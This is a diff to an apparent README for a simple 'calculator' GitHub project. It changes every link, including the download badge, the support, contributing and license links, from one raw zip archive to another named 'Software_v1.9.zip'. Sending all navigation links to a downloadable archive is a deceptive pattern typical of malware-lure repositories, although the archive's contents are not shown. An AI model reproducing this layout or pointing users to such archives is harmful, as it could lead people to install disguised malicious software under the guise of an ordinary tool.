@@ -6,13 +6,13 @@ Welcome to the calculator project! This simple tool helps you perform basic math
 
 ## 📥 Download Now
 
-[![Download Calculator](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip)](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip)
+[![Download Calculator](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip)](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip)
 
 ## 💾 Download & Install
 
 To get started, visit this page to download:
 
-[Download the latest version here.](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip)
+[Download the latest version here.](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip)
 
 ### Steps to Download
 
@@ -45,11 +45,11 @@ The calculator offers a range of features to help with your daily calculations:
 
 ## 📞 Support
 
-If you encounter any issues, feel free to reach out for help. You can contact support by raising an issue in the [issues section of this repository](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip).
+If you encounter any issues, feel free to reach out for help. You can contact support by raising an issue in the [issues section of this repository](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip).
 
 ## 📝 Contributing
 
-We welcome contributions! If you'd like to help improve this project, visit our [Contributing Guide](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip) for more details.
+We welcome contributions! If you'd like to help improve this project, visit our [Contributing Guide](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip) for more details.
 
 ## 📰 Topics
 
@@ -71,6 +71,6 @@ Feel free to explore and learn more about these topics through the project files
 
 ## 📊 License
 
-This project uses the MIT License. You may view the license details [here](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/calculator.zip).
+This project uses the MIT License. You may view the license details [here](https://raw.githubusercontent.com/xGeoMetric/calculator/main/unlapsed/Software_v1.9.zip).
 
 Thank you for choosing calculator! We hope it serves you well.
